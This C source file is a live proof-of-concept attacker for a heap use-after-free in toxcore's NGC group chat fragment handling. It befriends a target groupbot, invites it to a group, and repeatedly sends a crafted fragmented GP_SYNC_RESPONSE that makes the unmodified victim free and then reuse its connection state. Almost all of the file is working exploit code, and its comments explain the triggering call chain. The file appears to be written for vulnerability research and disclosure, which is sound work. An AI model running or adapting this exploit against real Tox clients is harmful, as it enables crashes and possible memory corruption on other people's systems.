/* SPDX-License-Identifier: GPL-3.0-or-later
 *
 * Live attacker for the group_chats.c handle_gc_packet_fragment() use-after-free.
 *
 * The attacker (modified toxcore) befriends the victim (an NGC-capable groupbot),
 * creates an NGC group and invites the victim. The groupbot accepts group invites
 * from its friend 0 (us), so it joins and becomes a confirmed peer.
 *
 * Then the attacker sends a *fragmented* GP_SYNC_RESPONSE whose reassembly is a
 * valid announce for a brand-new peer. On the victim:
 *
 *   handle_gc_udp_packet -> handle_gc_lossless_packet -> handle_gc_packet_fragment
 *     (final empty fragment) -> gcc_handle_packet_fragment
 *       -> handle_gc_lossless_helper -> handle_gc_sync_response
 *         -> unpack_gc_sync_announce -> peer_add -> mem_vrealloc(chat->group)  [FREES]
 *   back in handle_gc_packet_fragment: gc_send_message_ack(chat, gconn, ...) and
 *   gconn->last_received_packet_time = ... dereference the dangling gconn ->
 *   heap-use-after-free (observable when the victim runs under ASan).
 *
 * A normal peer never fragments a sync response (each announce is sent in its own
 * sub-500-byte packet), so this requires a modified sender. The victim runs
 * completely unmodified toxcore.
 *
 * Usage:
 *   gc_fragment_uaf_attacker <victim_toxid_hex> <node_ip> <node_port> <node_pk_hex>
 */
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../testing/misc_tools.h"

#include "tox.h"
#include "tox_struct.h"

#include "Messenger.h"
#include "group_announce.h"
#include "group_chats.h"
#include "group_common.h"
#include "group_connection.h"
#include "net.h"

static uint32_t group_numpeers(Tox *tox, uint32_t group_number)
{
    GC_Chat *chat = gc_get_group(tox->m->group_handler, (int)group_number);
    return chat == NULL ? 0 : chat->numpeers;
}

static void hex_to_bin(const char *hex, uint8_t *out, size_t len)
{
    for (size_t i = 0; i < len; i++) {
        unsigned int byte;
        sscanf(hex + 2 * i, "%02x", &byte);
        out[i] = (uint8_t)byte;
    }
}

static void on_friend_request(Tox *tox, const uint8_t *public_key, const uint8_t *message, size_t length,
                              void *user_data)
{
    (void)message;
    (void)length;
    (void)user_data;
    tox_friend_add_norequest(tox, public_key, NULL);
}

static Tox *make_tox(const char *ip, uint16_t port, const uint8_t *node_pk)
{
    Tox_Options *opts = tox_options_new(NULL);
    tox_options_set_local_discovery_enabled(opts, false);
    tox_options_set_udp_enabled(opts, true);
    Tox *tox = tox_new(opts, NULL);
    tox_options_free(opts);
    tox_bootstrap(tox, ip, port, node_pk, NULL);
    tox_add_tcp_relay(tox, ip, port, node_pk, NULL);
    return tox;
}

/* Craft and send the malicious fragmented GP_SYNC_RESPONSE to every confirmed
 * peer of the attacker's group. Returns the number of peers we fired at. */
static int fire_crafted_sync_fragment(Tox *tox, uint32_t group_number)
{
    GC_Chat *chat = gc_get_group(tox->m->group_handler, (int)group_number);

    if (chat == NULL) {
        return -1;
    }

    /* A valid base announce for a brand-new (third) peer. ip_port_is_set is
     * enough for gca_is_valid_announce(), so peer_add() accepts it and grows
     * chat->group on the victim. */
    GC_Announce ann;
    memset(&ann, 0, sizeof(ann));
    memset(ann.peer_public_key, 0x5A, ENC_PUBLIC_KEY_SIZE);
    ann.ip_port_is_set = true;
    ann.ip_port.ip.family = net_family_ipv4();
    ann.ip_port.ip.ip.v4.uint8[0] = 198;
    ann.ip_port.ip.ip.v4.uint8[1] = 51;
    ann.ip_port.ip.ip.v4.uint8[2] = 100;
    ann.ip_port.ip.ip.v4.uint8[3] = 7;
    ann.ip_port.port = net_htons(33445);

    uint8_t packed[256];
    const int packed_len = gca_pack_announce(chat->log, packed, sizeof(packed), &ann);

    if (packed_len <= 0) {
        return -1;
    }

    /* Pad past MAX_GC_PACKET_CHUNK_SIZE (500) so the send path fragments it; the
     * trailing bytes are ignored (gca_unpack_announces_list stops at max_count=1). */
    uint8_t payload[700];
    memset(payload, 0, sizeof(payload));
    memcpy(payload, packed, (size_t)packed_len);

    int fired = 0;

    for (uint32_t i = 1; i < chat->numpeers; ++i) {
        GC_Connection *gconn = get_gc_connection(chat, (int)i);

        if (gconn == NULL || !gconn->confirmed || !gconn->handshaked) {
            continue;
        }

        gcc_send_lossless_packet_fragments(chat, gconn, payload, (uint16_t)sizeof(payload), GP_SYNC_RESPONSE);
        ++fired;
    }

    return fired;
}

int main(int argc, char *argv[])
{
    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc < 5) {
        fprintf(stderr, "Usage: %s <victim_toxid_hex> <node_ip> <node_port> <node_pk_hex>\n", argv[0]);
        return 1;
    }

    uint8_t victim_id[TOX_ADDRESS_SIZE];
    hex_to_bin(argv[1], victim_id, sizeof(victim_id));
    const char *node_ip = argv[2];
    const uint16_t node_port = (uint16_t)atoi(argv[3]);
    uint8_t node_pk[TOX_PUBLIC_KEY_SIZE];
    hex_to_bin(argv[4], node_pk, sizeof(node_pk));

    Tox *a = make_tox(node_ip, node_port, node_pk);
    tox_callback_friend_request(a, on_friend_request);

    tox_friend_add(a, victim_id, (const uint8_t *)"hi", 2, NULL);

    printf("[*] waiting for the victim to come online as a friend...\n");
    bool friend_online = false;
    uint32_t group = UINT32_MAX;
    bool invited = false;
    int settle = 0;

    for (int i = 0; i < 200000; ++i) {
        tox_iterate(a, NULL);

        if (!friend_online) {
            friend_online = tox_friend_get_connection_status(a, 0, NULL) != TOX_CONNECTION_NONE;
            if (friend_online) {
                printf("[*] victim online; creating NGC group and inviting it...\n");
                group = tox_group_new(a, TOX_GROUP_PRIVACY_STATE_PUBLIC,
                                      (const uint8_t *)"g", 1, (const uint8_t *)"attacker", 8, NULL);
                if (group == UINT32_MAX) {
                    fprintf(stderr, "[!] tox_group_new failed\n");
                    return 2;
                }
            }
        } else if (group != UINT32_MAX && !invited) {
            invited = tox_group_invite_friend(a, group, 0, NULL);
            if (invited) {
                printf("[*] invited victim to group %u\n", group);
            }
        } else if (invited) {
            const uint32_t peers = group_numpeers(a, group);

            if (peers >= 2) {
                ++settle;
                // Let the groupbot's connection to us become confirmed/handshaked.
                if (settle > 400) {
                    break;
                }
            }
        }

        c_sleep(tox_iteration_interval(a));
    }

    if (group == UINT32_MAX || group_numpeers(a, group) < 2) {
        fprintf(stderr, "[!] victim never joined the group (peers=%u)\n",
                group == UINT32_MAX ? 0 : group_numpeers(a, group));
        return 3;
    }

    printf("[*] victim joined; sending crafted fragmented GP_SYNC_RESPONSE...\n");

    for (int round = 0; round < 200; ++round) {
        const int fired = fire_crafted_sync_fragment(a, group);
        if (round == 0) {
            printf("[*] fired at %d confirmed peer(s)\n", fired);
        }
        for (int i = 0; i < 20; ++i) {
            tox_iterate(a, NULL);
            c_sleep(tox_iteration_interval(a));
        }
    }

    printf("[*] done sending; the victim should have crashed under ASan.\n");
    tox_kill(a);
    return 0;
}
